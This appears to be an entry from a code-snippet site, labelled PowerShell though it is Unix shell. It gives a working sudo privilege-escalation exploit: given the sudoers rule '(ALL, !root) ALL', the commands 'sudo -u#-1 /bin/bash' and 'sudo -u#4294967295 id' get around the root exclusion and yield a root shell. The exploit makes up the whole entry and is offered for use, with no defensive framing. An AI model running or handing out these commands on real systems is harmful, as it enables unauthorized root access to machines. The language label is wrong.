---
id: 2c81d4c3-104b-4c4c-b11f-7a4e01103c98
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:19.107895+00:00'
updated_at: '2023-04-10T20:34:24.056791+00:00'
---

# Code Snippet 2c81d4c3

**Language**: Powershell

```powershell
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```


